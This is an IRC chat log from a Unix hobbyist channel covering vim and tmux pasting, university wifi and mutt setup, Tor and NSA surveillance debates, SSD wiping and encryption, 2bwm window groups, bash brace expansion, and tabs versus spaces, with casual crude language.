00:30  thang1thang │  so control+v in vim does nothing for example, it just thinks I pressed 'v'
00:34        dami0 │  https://wiki.archlinux.org/index.php/Keyboard_Shortcuts
00:34        dami0 │  use middle mouse rebind
00:34         vypr │  thang1thang2: CTRL+SHIFT+V
00:34        dami0 │  in urxvt you can yank links and paste, or just enter for default open
00:35  thang1thang │  control + shift + v? why that, vpyr?
00:35         vypr │  That's what worked for me.
00:35         vypr │  Just from experience.
00:35  thang1thang │  it kinda works for me on tmux
00:35  thang1thang │  but I also get a yellow popup that says "keycap insert mode"
00:35  thang1thang │  ⎈⎈⎈⎈⎈⎈⎈⇧ <- inserts that
00:35  thang1thang │  lol

00:37  thang1thang │  in .inputrc then?
00:37        dami0 │  towards the end, there's that one for rebinding the middle mouse
00:40  thang1thang │  okay. xsel, xbindkeys and xvkbd...
00:40  thang1thang │  shouldn't xmodmap do the same thing, though?
00:42        dami0 │  i dunno

00:44  thang1thang │  got it working

00:48  thang1thang │  I'd love that
00:48        dami0 │  also, arch isn't gnu/linux since it's not free
00:48        exaem │  thang1thang22: you'll have to do your own wpa_supplicant config file

00:49        exaem │  thang1thang22: change the wlp0s26f7u4 to your wifi card id
00:49        dami0 │  it's kind of silly, because people say the run Debian Linux or Archlinux
00:49        bosko │  Debian GNU/Linux
00:50        dami0 │  which is the userland and kernel, just like Windows NT
00:50        bosko │  Arch GNU/Linux
00:50        bosko │  Windows/Windows NT
00:50  thang1thang │  okay thanks! And my wpa_supplicant file I'll just make
00:50        exaem │  server={
00:50        dami0 │  but that's a retarded naming scheme
00:50  thang1thang │  The fucky thing about the wifi now is wifi works perfect already on my home wifi at both mom's and dad's place
00:50        dami0 │  people who know what gnu is don't need gnu/linux and the ones who don't, don't care
00:50  thang1thang │  but it's not working here right now for some reason because I have to "log" the computer in or something? idk. It just refuses to find everything. Ethernet works, though
00:51        dami0 │  ethernet>bluetooth>wifi
00:51  thang1thang │  Other thing I'll need to do is fuck with the mail... oy. I'm having a terrible time getting mutt working with my school's email
00:52        dami0 │  gotta get the imaps in, smtp out
00:52  thang1thang │  yeah. My school uses exchange 2007, I think?
00:53        dami0 │  that guiness went down the wrong hole. it burns
00:53  thang1thang │  There's an exchange settings & IMAP settings on the school website, but I can't get any of it to match mutt ._.
00:53        dami0 │  what do you mean. match?
00:54  thang1thang │  Everything on the webpage is under a different name. So it'll say "outgoing mail server" when mutt uses a different name, which is fine, except that even when I plug the smtp.url or the imap url it doesn't recognize it
00:55  thang1thang │  you could also do it with an OWA url, which the school doesn't provide...
00:55        dami0 │  smtp://your.emal@your.host@email@hosting.with:port

01:08        dami0 │  for?
01:08        dami0 │  mutt or wpa_supplicant?

01:10        dami0 │  thang1thang22: use the archwiki even if you don't use arch

01:10        dami0 │  bosko: thanks, but I knew about wifi-menu -o
01:11  thang1thang │  I do use arch, though lol. Wifi's just weird since we have an odd config for the wifi at my uni
01:11  thang1thang │  the default IP isn't 192.xxx-> it's 172
01:11  thang1thang │  they also use custom DNS servers and automatically block all others
01:11        dami0 │  most uni's have a weird config. most people have trouble connecting to it.
01:11         vypr │  192.168
01:11        dami0 │  afaik only android and windows connect to it more or less flawlessly
01:12  thang1thang │  Yeah my android connects flawlessly. OS X worked out-of-the-box for me as well, though
01:13  thang1thang │  I did have random disconnects though
01:13        dami0 │  iOS on the other hand has as many problems as linux ^.^
01:13        dami0 │  same with the disconnects. EVERYONE gets those though
01:13        dami0 │  it's just a part of life in uni's it seems

02:18         mxtm │  maybe if i was drunk or something
02:18       libbro │  mxtm: The NSA has le quantum computer, so they'll call you

02:20      jjumbii │  BigE: what could I do, so say, nothing in this chat could ever be used in a court of law?
02:20       libbro │  jjumbii: Go on...
02:20         BigE │  jjumbii: absolutely nothing?
02:20      jjumbii │  eh I just dreamt about driving golf cartsd
02:20      jjumbii │  BigE: nah man their has to be soemthing
02:20         BigE │  look at the logs that they managed to get Chelsea Manning with
02:21      jjumbii │  they can't pin something on *just* a username tho
02:21      jjumbii │  well, theoretically
02:21         BigE │  no, but seeing as this IRC is hosted at your home....
02:21      jjumbii │  true
02:21         BigE │  they can link you to that
02:21       libbro │  Well, I'm pretty sure it'll be easy to find the IRL identity for most of us
02:21       libbro │  Except BigE
02:21      jjumbii │  yeah i'm not too worried about that right now
02:21        tbuck │  lol i dont exactly hide it
02:21      jjumbii │  but, just in case
02:21      jjumbii │  tbuck: same
02:21       libbro │  He is the encryption master
02:22       libbro │  tbcktu: Yeah...
02:22         BigE │  unless you create a completely new persona, and never connect without Tor, and never talk about anything that could link you back to something, you are not 100% safe
02:22       libbro │  ^
02:22         BigE │  libbro: i am sure you could find me if you wanted
02:22      jjumbii │  i don't even know if Tor is that safe anymore
02:22         BigE │  anyone who is logging this could probably put pieces together
02:22       libbro │  jjumbii: Tor isn't that secure
02:23         BigE │  jjumbii: you are kidding right?
02:23      jjumbii │  BigE: didn't you see that NSA document showing how they can intercept it?
02:23         BigE │  all the NSA literature that has been leaked shows us that is it, in fact, safe
02:23       libbro │  ^
02:23         BigE │  jjumbii: yes, but it takes 6 months
02:23      jjumbii │  ah, ok
02:23        dami0 │  most of it relied on them hosting exit/transfer nodes
02:23         BigE │  6 months of constant passive data capture aimed at *you*
02:24         BigE │  dami0: that is horse shit
02:24       libbro │  BigE: You're pretty safe using it if your shit is encrypted and you don't do stupid stuff that could be traced back to you
02:24        dami0 │  considering Cerberus has resources to do it, they can mane
02:24         BigE │  why bother hosting an exit node when you can just get the ISP logs
02:24        dami0 │  they can fucking do it
02:24      jjumbii │  Tor is pretty slow though
02:24         mxtm │  yeah it's slow as fuck
02:24         BigE │  really?
02:24       libbro │  jjumbii: It depends
02:24         BigE │  i use it for regular browsing
02:24      jjumbii │  unless it has sped up since i last used it a month ago
02:24         BigE │  i notice nothing different
02:24        dami0 │  I bet Google is just a cerberus front.
02:24       libbro │ puts on tinfoil hat
02:25      jjumbii │ puts on aluminum foil hat
02:25         BigE │  it isnt a tinfoil hat if there are literally 1000's of documents showing that you are right
02:25       libbro │  I know..
02:25        dami0 │  it's not paranoia if they *are* out to get you
02:25       libbro │  But just talking about it puts you in tinfoil hat terretory
02:25         BigE │  ^
02:26        dami0 │  libbro: maybe the normal dweebs think that
02:26         BigE │  why?
02:26         BigE │  yeah, exactly
02:26       libbro │  Well, practically everyone I know is a normal dweeb
02:26      jjumbii │  well... time to install openbsd
02:26        dami0 │  even after they've been shown the evidence, they're too weak to accept the truth
02:26       libbro │  jjumbii: I was gonna install that too
02:27      jjumbii │  brb
02:27       libbro │  dami0: Too apathetic is more like it
02:27      jjumbii │  BigE: control the channel
02:27         BigE │  dami0: or too stupid

02:45        dami0 │  he is now too well off for that. 
02:45       libbro │  dami0: >implying that that wasn't about hinmself
02:46       libbro │  Snowgoons is German...
02:46       libbro │  I guess that's cool
02:46        dami0 │  pretty sure he wasn't a polish guy hanging out with ukrainians smuggling alcohol from east to west border
02:46       libbro │  dami0: You never know m8
02:46        dami0 │  the guy in the song only got away because he fucked off to another country.
02:47       libbro │  Oh...
02:47        dami0 │  nah, that's the type stuff you can't even reference if you get out.
02:48        dami0 │  these are hardcore motherfuckers. roll into to town and escape a police chase because you got a dodge vypr types
02:48        dami0 │  the people who smuggle alcohol, not the rapper.

02:56       libbro │  True...
02:56        dami0 │  there is actually a surprisingly low amount of unix talk on here. In fact, unix talk is directly proportional to the amount of yrmt on the channel
02:56       libbro │  That is SO true
02:56        tbuck │  mhm
02:57       libbro │  We just talk about random stuff

04:15         BigE │  ripper: excuse their paranoia, we have just been dealing with a very annoying and persistant spammer
04:15       ripper │  Oh I see!
04:15        tbuck │  using tor doesnt make you any less suspicious
04:15       ripper │  Well I'm a new guy here that just started using Linux a few days ago
04:15  dcat|laptop │  hey brosephs
04:15       ripper │  not that I really know how to use it well :3
04:15       ripper │  So yeah :)
04:16       ripper │  Am on Mac OS X but running Crunchbang through a VM
04:16       ripper │  ok that doesn't matter anyway
04:16       ripper │  happy to meet you all :)
04:16  dcat|laptop │  ripper sounds phishy
04:16       libbro │  Welcome to Unixhub!
04:16  dcat|laptop │  the old ripper had been using linux for a long time
04:16       libbro │  Or as I like to call it...
04:16         BigE │  oh please
04:16       libbro │  Eunuch's Hub
04:16         BigE │  just chill out you paranoia fuckers
04:16       ripper │  Idk about that ripper really :)
04:16       ripper │  Thanks libbro
04:16       ripper │  and I think Unixhub is easier to spell :|
04:17      jjumbii │  sup dcat|laptop 
04:17  dcat|laptop │  oh hey bruh
04:18      jjumbii │  this bosko dude is crazy lol
04:18        tbuck │  probably just really really hopelessly lonely
04:19  dcat|laptop │  indeed
04:19       ripper │  Are you guys still thinking I mightbe that bosko guy or are you just talking about it? :|
04:19        tbuck │  no worries ripper, if you are bosko we'll know eventually. the douchebag oozes off him
04:19       ripper │  I see :3
04:20      jjumbii │  ripper: nah, you're fine lol
04:20       ripper │  Phew that's great then :3
04:20       ripper │  BTW guys can you help me with some VM thingy? :|
04:20       ripper │  I'm new to all this Linux so I know nothing about it !
04:21  dcat|laptop │  jjumbii: pm
04:21        tbuck │  whats the problem ripper?
04:22       ripper │  Am running Crunchbang on VirtualBox and I heard it doesn't consume much resources
04:22       ripper │  and although it's not using much RAM ( I gave it 497 mb)
04:22       ripper │  when I open more than an app or so
04:22       ripper │  or even just a 720p video
04:22       ripper │  the CPU usage skyrockets to 100%
04:22       ripper │  and surely I have to either bear for idk how long to quit things
04:22       fenriz │  i find that ram/cpu in a VM is really, really inaccurate.
04:22       ripper │  or just turn off the VM
04:22       ripper │  Yeah but the lag sure is!
04:23       fenriz │  my bspwm in a vm, ran at 50mb of ram consistently lol.
04:23       fenriz │  ah i see.
04:23        tbuck │  hmm.. could be a just a vm thing
04:23       ripper │  Like now I'm using pidgin, a terminal app to download something,  and weezechat on terminal and cpu usage about 50%
04:23       ripper │  and if I use VLC lag starts going on like hell
04:23       ripper │  VLC for an mp3 of course!
04:23       ripper │  Hmm perhaps a VM thingy
04:23      jjumbii │  it is
04:23       ripper │  just not a Linux thing,right?
04:24      jjumbii │  no
04:24       ripper │  I think I'll have to use some other VM program soon or just google more about this
04:24         quit │  bottomy
04:24         BigE │  ripper: couple of things to check: How many cores from the bare metal CPU have you allocated to the VM? have you enabled hardware acceleration? Have you installed any tools into the VM OS for better performance within a VM?
04:24         join │  bottomy
04:24         mode │  +v bottomy
04:24       ripper │  Hmm let me see all that :|
04:25         BigE │  most VM suites have drivers that you can install on the virtualized OS for better performance
04:25         BigE │  and if you have more than 2 cores, you might want to allocate more than a single core to the VM
04:25         BigE │  and like I said, hardware acceleration will hopefully let the VM take advantage of your GPU
04:25       ripper │  Well first it said 1 CPU (the green bar is there so allocatig only one is better)
04:26       ripper │  Let me see hardware acceleration
04:26       ripper │  And yeah it is enabled
04:26      jjumbii │  ripper: just take the plunge
04:26      jjumbii │  boot off usb or something
04:26       libbro │  ^
04:26       libbro │  Probably the best idea
04:27       ripper │  I see!
04:27        tbuck │  yeah ive never liked testing things in a vm for reasons like that
04:27       libbro │  You'll get much better performance
04:27       libbro │  But.. things may take longer to load
04:27       libbro │  But... not as much lag
04:27       ripper │  I see
04:27       ripper │  Well I don't really know much to do anymore but we'll see
04:27       ripper │  THanks for everything :)
04:27       libbro │  It is pretty simple
04:27       ripper │  If googling fails to give me any good results, I'll boot off USB :)
04:28       libbro │  There are plenty of tools that can be used to easily create bootable USBs
04:28       ripper │  I can google on how to do that :)
04:28       ripper │  I just meant I  didn't know what choice to take
04:28       libbro │  But I gotta go to sleep, so if you need any more assistance just PM me
04:28       ripper │  Sure :)
04:28       libbro │  okay...
04:28       libbro │  :)
04:28       ripper │  (It's 5:28 AM and haven't slept yet)

04:40     NeoTerra │  he admitted to hacking the nickserv passwords

04:42         BigE │  please no
04:42         dcat │  then next time bosko joins, we make them fight till death
04:42         BigE │  why dont we just put both of them in the same channel

04:42         BigE │  no one else can say anything

04:42         dcat │  we tell L8D he can stay if he manages to insult bosko so deeply he leaves forever
04:43     NeoTerra │  yes this is a very mature approach -.-
04:43         dcat │  lel

04:43         BigE │  not*
04:44         dcat │  though, NeoTerra are you gonna set it so that people have to register to join?
04:44     NeoTerra │  dunno yet
04:44         dcat │  then you can set up a channel that all non-registered users automatically join

05:57        tbuck │  i have no idea at this point probably will just build it with the script and only install that one program
05:59        tbuck │  even took the build function out of that script and tried to use that... tnope
06:00        tbuck │  then again to run this program you have to be in the same directory as the binary which makes no sense. so wouldnt surprise me if it was something stupid like that

07:24         dcat │  just out of my basic understanding of how SSDs work, I'm guessing zero-out is just gonna shorten it's lifetime
07:25         BigE │  short answer?
07:26         BigE │  you cant
07:26         BigE │  without severly degrading the drive
07:26         dcat │  yeah, that's what I was guessing
07:26         BigE │  the nature of flash storage employs something called wear levelling
07:26         BigE │  so when you buy a 60GB SSD
07:26         dcat │  I'm just gonna shred the files I don't want people to get
07:27         BigE │  it is probably actually 80GB
07:27         dcat │  interesting.
07:27         dcat │  didn't know that.
07:27         BigE │  and that means that data gets moved around and written to different parts of the drive so that you dont have specific NAND chips failing before others
07:27         BigE │  and that means that you are not constantly writing to the same chip
07:28         BigE │  which goes in hand with the previous point
07:28         BigE │  what do you mean by shred?
07:28         BigE │  like, the linux shred utility?
07:28         dcat │  /dev/random (size)file -> file
07:28         dcat │  yeah
07:28         BigE │  yeah, that doesnt actually work
07:28         BigE │  lul
07:29         BigE │  because of the way the internals of an SSD controller works
07:29         BigE │  wear levelling mate
07:29         BigE │  lul
07:29         dcat │  ;_;
07:30         dcat │  oh well
07:30         dcat │  I guess the osx installer is gonna jumble all the bits around enough
07:30         BigE │  ummm
07:30         BigE │  wut
07:30         dcat │  especially with osx's language packs
07:31         BigE │  so in practice, the only way to ensure no one can ever read it is to encrypt the drive and/or the important files on it from the start
07:31         BigE │  hence why all my computers using SSD's use FDE
07:31      dcat|lp │  hmm
07:32      dcat|lp │  what do you have to hide though?
07:32         BigE │  why is that even a question
07:32        tbuck │  his monkey porn
07:32         BigE │  no one questions when you have a lock on your bedroom door/
07:32        tbuck │  duh
07:32      dcat|lp │  oh.
07:33         BigE │  and seeing as computers are essentially an extension of our personal space and being at this point
07:33         BigE │  i find the question quite silly
07:33        tbuck │  "i got nothing to hide" also a pretty silly statement
07:34         BigE │  you have nothing to hide until you have something to hide, at which point you can't hide
07:34        tbuck │  mmmmhmm
07:35      dcat|lp │  "I got nothing to hide" is just humans way of keeping their dignity while being assraped by authoroties
07:35        tbuck │  ive talked to people who say that about the whole NSA deal
07:35        tbuck │  drives me mad
07:35        tbuck │  just.. dont.. even..
07:36      dcat|lp │  truly, if NSA actually stopped terrorists with this, I'd be fine with it
07:36        tbuck │  to me i just get aggrevated because when does it stop
07:36         BigE │  but why?
07:36        tbuck │  where does it stop
07:37      dcat|lp │  BigE: me or tbuck?
07:37         BigE │  you
07:37        tbuck │  especially when people have that "nothing to hide" attitude
07:37      dcat|lp │  cause my privacy isn't worth a 1000 lives
07:37         BigE │  why is "stopping terrorism" more valuable than peoples right to free speech, expression, and privacy?
07:37         BigE │  it isnt your privacy
07:37         BigE │  it is EVERYONES
07:38         BigE │  the privacy of 7 billion people is easily worth 1000 lives
07:38      dcat|lp │  yeah, and I think that's a sacrifice we would have to take if this saved lives
07:38      dcat|lp │  I don't agree.
07:38         BigE │  maybe then we should consider what is wrong that we are causing people to commit such acts in the first place?
07:38        tbuck │  if we had voted on it as a country.. thatd be a little different. theyve gone behind the backs of the entire nation
07:38      dcat|lp │  but the fact is, none of these spying programs have saved any lives
07:39      dcat|lp │  true BigE 
07:39         BigE │  and they wont, because terrorists have, for 20 years, not trusted electronic communications anyways
07:39      dcat|lp │  that would be the ideal fix
07:39      dcat|lp │  wat
07:40      dcat|lp │  cause only arabs are terroists?
07:40         BigE │  What?\
07:40      dcat|lp │  >because terrorists have, for 20 years, not trusted electronic communications anyways
07:40      dcat|lp │  seems like you're talking about under-developed countries
07:40         BigE │  it has been known since the late 70's that in one form or another, every type of electronic communication is either monitored or succeptible to monitoring
07:40      dcat|lp │  or are you talking about crazy uncle jester in a cabin?
07:41         BigE │  no, i am talking about actual terrorists
07:41         BigE │  they dont use the internet
07:41         BigE │  or radios
07:41         BigE │  or cell phones
07:41         BigE │  maybe in a support capacity
07:41         BigE │  but no in an operational logistics way
07:41      dcat|lp │  are you crazy?
07:42      dcat|lp │  90% of all terrorists are enlisted online
07:42         quit │  bottomy
07:42         join │  bottomy
07:42         mode │  +v bottomy
07:42         BigE │  No, have you ever actually read any of the opsec material from alqaeda or other homebrew terrorists?
07:42         BigE │  enlisted
07:42         BigE │  not trained
07:42         BigE │  not organized
07:42         BigE │  not commanded
07:43         BigE │  enlisted
07:43      dcat|lp │  opsec material?
07:43      dcat|lp │  that's kind of the point of opsec
07:43         BigE │  because unless you are a very high tech terrorist, of which we have not seen, you dont use electronic communications for anything serious
07:44         BigE │  yes
07:44         BigE │  clandestine operations manuals, al qaeda manuals, etc
07:44      dcat|lp │  I'm not trying to pull a yrmt or anything
07:44         BigE │  lots of that sort of stuff on Tor
07:44      dcat|lp │  but I seriously need to eat
07:44      dcat|lp │  I'll be afk 50%
07:45        tbuck │  "pull a yrmt" lol
07:47      dcat|lp │  just keep talking
07:47      dcat|lp │  50% here
07:50      dcat|lp │  alright, back
07:51      dcat|lp │  I don't really feel like tor is safe
07:51      dcat|lp │  what do you think BigE?
07:52         BigE │  the facts say that Tor is safe
07:52         BigE │  the research says it is
07:52         BigE │  i dont know why it wouldnt be
07:52      dcat|lp │  would this analogy be correct to use?;
07:53      dcat|lp │  say every net packet your sending is a letter
07:53      dcat|lp │  nsa is the mailman
07:53      dcat|lp │  he can open the letters at any time, read them, and then relay them on
07:54         BigE │  no?
07:54      dcat|lp │  using tor is like editing the "sender" field on the letter, and then encrypting it
07:54      dcat|lp │  no?
07:54         BigE │  I dont see it
07:54      dcat|lp │  hm
07:55         BigE │  tor is like having a letter inside a letter inside a letter, and each letter has a different sendto address
07:55         BigE │  and lets pretend that each address can only open one layer of letters
07:55      dcat|lp │  okay
07:55         BigE │  of course all 3 addresses might be NSA
07:56         BigE │  but
07:56         BigE │  when you start using the addresses of ordinary people to bounce packets
07:56         BigE │  it becomes much harder
07:57      dcat|lp │  okay
07:57      dcat|lp │  but the mailman/nsa can still open the letter between each address
07:57         BigE │  sure, but the letters contents is encrypted
07:58         BigE │  so good luck reading it unless you are the last address before it goes to the final address
07:58      dcat|lp │  yeah, but if the mailman has designed the protocol of encryption ...
07:58         BigE │  but they havent....
07:58      dcat|lp │  what encryption is tor using?
07:58         BigE │  so your point is completely moot
07:58         BigE │  AES-128,196,256
07:59      dcat|lp │  also, I'm not trying to be a douche if that's what it sounds like
07:59      dcat|lp │  I appreciate you teaching me this.
07:59         BigE │  i dont think that
07:59         BigE │  lul
07:59      dcat|lp │  oh, good.
08:00      dcat|lp │  I just tend to piss people off by being straightforward
08:00         BigE │  for all the shit people give AES, it wasnt designed with any input from NIST or the NSA, I dont believe it has any mystery prime numbers in it, and there have been a lot of people trying to crack it for 20 years now
08:01      dcat|lp │  personally, I consider every NSA-apporoved encryption to be phishy
08:02      dcat|lp │  I'm looking forward to the future when BigE makes a new encryption 
08:02         BigE │  also, the chances of there being some sort of key-escrow backdoor in AES is ridiculous, the US gov is not stupid enough to put a backdoor into the standard they use for data encryption
08:02         BigE │  pfff
08:02      dcat|lp │  srs
08:02      dcat|lp │  that'd be awesome
08:02         BigE │  you cant have an encryption standard not approved by the NSA
08:02      dcat|lp │  wut
08:03      dcat|lp │  what happens if it's not approved by them?
08:03         join │  venam
08:03         mode │  +v venam
08:03         BigE │  then it is probably shit
08:03        venam │  Hello UH
08:03      dcat|lp │  lel
08:03      dcat|lp │  dropped cigarett on laptop :'<
08:04      dcat|lp │  sup venam 
08:05         BigE │  the the NSA approves of a billion things
08:05      dcat|lp │  BigE: would /you/ not trust a encryption not approved by the NSA?
08:05         BigE │  i would trust it
08:05         BigE │  the NSA approves of ECC and i am certainly not worried about that either
08:05         BigE │  well
08:06         BigE │  maybe to rephrase
08:06         BigE │  the NSA uses strong encryption
08:06         BigE │  you always want to use strong encryption
08:07         BigE │  if a standard is not NSA approved, at least in the current crypto sphere, it is probably either immature, lacks research, or is broken
08:07         BigE │  just because the NSA does some bad stuff doesnt mean they dont have some legitimate position on evaluation encryption
08:08         BigE │  evaluation of*
08:08      dcat|lp │  hm
08:09      dcat|lp │  I just feel like NSA is trying to be this totalitarian superpower online
08:09      dcat|lp │  and I tend to not trust the big guy in charge
08:09      dcat|lp │  those in power will always want to keep it that way
08:10         BigE │  Then you should probably just not trust anything, dont trust your food, dont trust your drinking water is safe
08:10      dcat|lp │  I don't.
08:10         BigE │  then there is no bother going any further
08:11      dcat|lp │  okay then
08:13         dcat │  BigE: which os do you run?
08:14        tbuck │  plebian 
08:15         dcat │  lel
08:15        tbuck │  jk of course i dont hate lol
08:15         dcat │  debian is pretty good lel
08:15        tbuck │  yeah its kinda hard to hate on debian
08:16         BigE │  yes
08:16         BigE │  debian
08:16         BigE │  master race
08:16         dcat │  were you on slackware or arch tbuck?
08:16        tbuck │  im on slackware 
08:16        tbuck │  ive been on arch before
08:16        tbuck │  and i can see myself using debian at some point
08:16         dcat │  openbsd masterrace!
08:16         dcat │  sorry, had to.
08:18        tbuck │  i havent played with the bsds much myself
08:19         dcat │  well, whatever you do, no freebsd
08:20        tbuck │  i played with that a tad, didnt see the point i used it just like id use linux
08:21         dcat │  I guess the reason most people use it is cause they don't want bloat in the kernel
08:22         BigE │  yeah but some of us like our kernel functional as well
08:24         dcat │  oh
08:24         dcat │  what's not functional on *bsd?
08:26        tbuck │  if i was worried about bloat i wouldnt be using slackware.. goddam everything is included in the base install
08:26        tbuck │  trimmed it down of course but things like the -dev packages are all bundled in

09:02        z3bra │  problem is, alt-tab only works to cycle between windows of the current group
09:02        z3bra │  same for moving/resizing windows :/
09:03        z3bra │  ping venam 
09:03         dcat │  he was on not that long ago
09:04        z3bra │  ima wait then
09:04        z3bra │  That's just to know the patch format he wants
09:05        z3bra │  anyway, it's hacky atm :/
09:05        z3bra │  I need to implement moar stuff, and think about the behavior I want
09:07         dcat │  wow
09:07         dcat │  I'm so outraged by intel's naming now
09:07         dcat │  "edison"?

09:08         quit │  venam

09:33        z3bra │  yeah :/
09:33        z3bra │  ima make a video I think
09:34         dcat │  yeah, I think that's a good idea
09:36         join │  evo

09:37        z3bra │  haha
09:37          evo │  If I remember correctly {1..4} would translate to 1 2 3 4 right? Is there any way to do something like if [ $blah == blah[1-4] ] ?
09:38          evo │  Basically a way to compare a range, and still support text
09:39         dcat │  wrong chan?
09:39        z3bra │  evo, isn't that bash only ?
09:39          evo │  Not really, lots of scripters here
09:39          evo │  Its for bash
09:39         dcat │  oh.
09:40        z3bra │  if [[ $bla == "blah{1..4}" ]] ?
09:40          evo │  Thats what I have but not sure if that translates to blah1, blah2, etc
09:41          evo │  It might end up as blah1 2 3 4
09:41        z3bra │  http://raw.z3bra.org/null/2bwm-group.mp4
09:41        z3bra │  ─ echo "blah{1..4}"
09:41        z3bra │  blah{1..4}
09:41        z3bra │  ─ echo "blah"{1..4}
09:41          evo │  Hm so it does work
09:41        z3bra │  blah1 blah2 blah3 blah4
09:42        z3bra │  here's your answer =)
09:42          evo │  Good, so my original script should work
09:42          evo │  Some guy is using a python script plus 2 deps for a greeter in his bashrc
09:43        z3bra │  bleh
09:43          evo │  I was like wat? You can do it in one function 
09:43        z3bra │  dcat, did you see the video ?
09:43         dcat │  yeah
09:44         dcat │  I don't quite get it though
09:44        z3bra │  each 'desktop' is a group number
09:44         dcat │  yeah, I get that
09:44         dcat │  I don't get how it's superior
09:45        z3bra │  you can show multiple groups at the same time :)
09:45        z3bra │  while with workspace, you can see only one at a time
09:46          evo │  So its like a "frame" in hlwm?
09:46        z3bra │  I've never used hlwm
09:46        z3bra │  it's the same group system as CWM has
09:46        z3bra │  (less featured tho)
09:47         dcat │  so, it's kind of like sticky windows?
09:47         dcat │  *mod+f)
09:47         dcat │  (*
09:47        z3bra │  dcat, not really
09:47         dcat │  oh
09:48        z3bra │  sticky windows are ALWAYS shown
09:48        z3bra │  you can't hide them
09:48         dcat │  yeah, I'm just saying similar concept
09:49        z3bra │  well, kinda
09:49        z3bra │  but here you can toggle sticky windows
09:52        z3bra │  eg, I usually put IRC on group 1, dwb on group 2
09:52        z3bra │  Then I work on group 3, and build GUIs on group 4
09:52        z3bra │  So I show groups 3 and 4 at the same time, while 1 and 2 are hidden
09:53        z3bra │  Then, I ear the 'beep' telling I have some HL on irc -> alt+f1 to show the "IRC group" and bring my irssi window in front

09:53         mode │  +v tida
09:54        z3bra │  while chatting, I can still work, as my groups 3 and 4 are still shown
09:54        z3bra │  then, I'm done IRCing, so alt+f1 will hide it. 
09:55          evo │  How is dwbs stability lately?
09:55        z3bra │  back to work, I need to search a lib documentation on the web: alt+f2 brings the web browser on front, And I can read from the browser while typing code (which is on group 3)
09:57        z3bra │  It easier to show a group, than switching to a workspace, *fix* the window, going back to the previous workspace, performing operation, then sending the window bakc to it's workspace and coming again to the old workspace :p
09:57        z3bra │  evo, what's the problem with dwb ? it's always work like a charm to me
09:58          evo │  Well when I first started using it I would have issues loading certain stylesheets which turned out to be a bug with gnutl, after that was fixed It would randomly crash.
09:59          evo │  So I stopped using it
09:59          evo │  Though I will admit I didn't exactly scour my logs to find out why
09:59          evo │  So shame on me
10:00          evo │  Ah and even after adding an adblock list it still didn't block any
10:00          evo │  (It was definately enabled in the settings)
10:01        z3bra │  there's a plugin (accessible throug dwbem) to block adds
10:01        z3bra │  But as I don't use it, I don't know if it works
10:02          evo │  Yeah I had installed, enabled, and setup the easylist but it didn't work.
10:02          evo │  Has been awhile since I've tried it again
10:02        z3bra │  what do you use atm 
10:02        z3bra │  ?
10:02          evo │  firefox
10:02        z3bra │  that bloat
10:03        z3bra │  firefox's on the way to remove plugin support :)
10:03          evo │  Yeah mostly becouse I need firebug

10:04        z3bra │  okay
10:04          evo │  I wonder if plugin support is being removed from the main branch of firefox or from the engine itself..
10:05          evo │  If not then there will probobly be a fork within the day its removed
10:06        z3bra │  idk
10:06        z3bra │  anyway, plugins are gonna die
10:06        z3bra │  muh quakelive :(
10:07          evo │  I'll probobly move to chromium or a fork of firefox
10:07          evo │  but building chromium...
10:07          evo │  I've always been a fan of the GUI
10:08          evo │  I had been making my firefox look similar since before it existed
10:09        z3bra │  chromium will drop plugin support too

11:50        z3bra │  ^ showcase
11:53        z3bra │  The problem is that you can only cycle through the windows of the current group :/
11:53        z3bra │  Im' working on that, but the focusnext_helper function is a mess
11:53        z3bra │  proof -> tab indented :p
11:54         quit │  vosh
11:54      dcat|lp │  ... why does everyone have a problem with tab indention?
11:54        z3bra │  I don't like it :)
11:55         yrmt │  z3bra: nice!
11:55         yrmt │  that's all though?
11:55      dcat|lp │  yeah, I got that, but why?
11:55        z3bra │  moreover, the whole source is space indented, while only this function is tab-indented
11:56      dcat|lp │  still.
11:56      dcat|lp │  why?
11:56        z3bra │  yrmt, yep. Also, i'd like to make group 0 the "main group", so that if you hide group 0, all groups are hidden, and showing it will show all group (as in cwm)
11:56         yrmt │  do et
11:57        z3bra │  I have nothing against tabulation, I just like my files to look the same everywhere
11:57      dcat|lp │  that's what's great about tab though
11:57      dcat|lp │  it's meant for alignment
11:58        z3bra │  nope
11:58        z3bra │  it's shit for alignment
11:58      dcat|lp │  o_o
11:58          evo │  Most editors allow you to change the size of tabs
11:58        z3bra │  It's okay for indentation, as by changing tabstop, you can have the indentation size you want
11:58      dcat|lp │  not that it matters in this day and age
11:58        z3bra │  BUT
11:58      dcat|lp │  but 5 spaces take up more space than one single tab char
11:59          evo │  Well tabs are 4 by default right?
11:59        z3bra │  if one aligns text with tabs, using tabstop 8, and I use tabstop 2, the alignement will be fucked up for me
11:59      dcat|lp │  8 I think?
11:59         yrmt │  set tabstop=8   
11:59        z3bra │  evo -> 8 by default
11:59         yrmt │  ftw
11:59          evo │  wth
11:59          evo │  If I press space 4 times its the same length as a tab for me
11:59          evo │  In like everything
12:00          evo │  You also can't insert a space in front of lines easily in bulk
12:00        z3bra │  but, yrmt uses 8 space for tabulation, so if you align something with tabstop=4, it will be fucked up in tabstop=8
12:00          evo │  But most editors let you hilight + tab multiple lines
12:00          evo │  Well without sed or something
12:01          evo │  s/$/ /
12:01          evo │  etc
12:01        z3bra │  and ?
12:01        z3bra │  when I use <tab> is insert spaces for me :)
12:01          evo │  It certain editors yeah
12:01        z3bra │  the problem with tabulation is not with indentation, it's with alignement
12:01        z3bra │  let me show you
12:01          evo │  I know I can set tabs to N spaces in gedit
12:01      dcat|lp │  vim masterrace
12:02          evo │  I know what you mean
12:02          evo │  But I don't see that with tabs
12:02          evo │  I usually see that issue with spaces
12:02        z3bra │  oO
12:02      dcat|lp │  z3bra: show us what you mean
12:02          evo │  characters being slightly back/forward from text above/below
12:04          evo │  I had this issue when trying to type code into a mybb post, I would use 4 spaces becouse tabs deselect the text area, and for some reason they would not be the same length
12:05          evo │  But typing my code into gedit/notepad++ with tabulation then pasting worked beautifully

12:30      dcat|lp │  the picture, that is
12:30        z3bra │  they're not properly aligned
12:31        z3bra │  same for macros
12:31      dcat|lp │  but you're using spaces and tabs
12:31        z3bra │  let me correct this then
12:32      dcat|lp │  meh, it's just a preference
12:32      dcat|lp │  not that big of a deal
12:33      dcat|lp │  works fine for me // http://pub.iotek.org/p/FwjnzDa.png
12:34        z3bra │  because you use a tab of 8 spaces
12:34      dcat|lp │  as it should be ;P
12:34        z3bra │  for anybody that uses something else, the display will be fucked up
12:35        z3bra │  http://raw.z3bra.org/img/wm/tab-fuck.png
